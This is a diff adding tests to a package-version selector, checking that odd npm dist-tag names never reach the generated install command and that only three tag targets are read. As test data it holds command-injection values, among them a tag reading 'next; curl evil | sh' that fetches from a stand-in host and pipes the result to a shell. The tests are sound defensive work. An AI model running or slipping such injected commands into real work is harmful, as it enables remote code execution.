@@ -140,6 +140,32 @@ describe("published tags and tag targets the list does not hold", () => {
     expect(await selectVersion({ pkg: p, asked: "19.1.10", read: noRead })).toMatchObject({ install: { kind: "exact", version: "19.1.10" } });
   });
 
+  test("a tag that is not a plain name never reaches a command: the version is pinned", async () => {
+    const p = pkg({ latest: "1.3.0", distTags: { latest: "1.3.0", "x;rm": "1.2.0", "a'b": "1.2.0" }, versions: [row("1.3.0"), row("1.2.0")] });
+
+    for (const tag of ["x;rm", "a'b"]) {
+      const selected = await selectVersion({ pkg: p, asked: tag, read: noRead });
+
+      expect(selected).toEqual({ kind: "shown", version: "1.2.0", install: { kind: "exact", version: "1.2.0" }, read: null });
+
+      if (selected.kind !== "shown") return;
+      expect(installCommand({ client: "npm", name: "left-pad", install: selected.install })).toBe("npm install left-pad@1.2.0");
+    }
+
+    const onlyHostile = pkg({ latest: null, score: null, distTags: { "next; curl evil | sh": "0.1.0" }, versions: [row("0.1.0")] });
+
+    expect(await selectVersion({ pkg: onlyHostile, asked: undefined, read: noRead })).toMatchObject({ version: "0.1.0", install: { kind: "exact", version: "0.1.0" } });
+  });
+
+  test("tag targets the list does not hold: only the highest three are read, whatever the tag count", async () => {
+    const tags = Object.fromEntries(["1.0.0", "2.0.0", "3.0.0-rc.1", "3.0.0", "10.0.0", "9.1.0"].map((v, i) => [`t${i}`, v]));
+    const p = pkg({ latest: null, score: null, distTags: { ...tags, again: "10.0.0" }, versions: [row("0.1.0", { status: "yanked" })] });
+    const asked: string[] = [];
+
+    await selectVersion({ pkg: p, asked: undefined, read: async (version) => (asked.push(version), { kind: "ok", value: details(version, "2026-01-01T00:00:00.000Z") }) });
+    expect(asked.toSorted()).toEqual(["10.0.0", "3.0.0", "9.1.0"]);
+  });
+
   test("a prerelease tagged latest installs by name, as the published tag says", async () => {
     const p = pkg({ latest: "0.9.0-beta.1", distTags: { latest: "0.9.0-beta.1" }, versions: [row("0.9.0-beta.1")] });
 
